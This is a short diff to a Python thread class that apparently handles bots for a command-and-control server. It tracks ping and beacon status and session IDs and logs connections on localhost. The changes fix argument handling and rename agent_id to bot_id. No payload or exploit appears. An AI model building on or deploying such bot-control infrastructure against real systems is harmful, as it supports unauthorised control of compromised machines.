@@ -30,14 +30,14 @@ class Handler(threading.Thread):
             self.status = ["UP","UP"]                       # <--UP - DOWN - ERR 
                                                             # [0] = PING, [1] = BEACON
         #http signature
-        elif len(args) == 1:
+        elif len(args) == 2:
             threading.Thread.__init__(self)
-            self.loggers = args[3]
+            self.loggers = args[1]
             self.ip = '127.0.0.1'
             self.port = 5000
             self.address = "http://127.0.0.1:5000"
-            self.agent_id = args[0]
-            self.info = [self.agent_id,self.ip,self.port]
+            self.bot_id = args[0]
+            self.info = [self.bot_id,self.ip,self.port]
             self.beacon_wait = False
             self.os = ''
             self.interactive = False
@@ -63,7 +63,6 @@ class Handler(threading.Thread):
         # Returns 'Thread-#': Useful for specific interaction?
         # This specific line returns 'None'
         #self.BotName = threading.current_thread().getName()
-
         print(f"[*BotHandler-Msg] Bot {self.ip}:{str(self.port)} connected with Session ID of {str(self.bot_id)}")
         loggers[0].q_log('conn','info','[* BotHandler-Msg] Bot '+self.ip+':'+str(self.port)+' connected with Session ID of '+str(self.bot_id))
         loggers[0].q_log('serv','info','[* BotHandler-Msg] Bot handler object created for: '+self.ip+':'+str(self.port)+'; Session ID of '+str(self.bot_id))
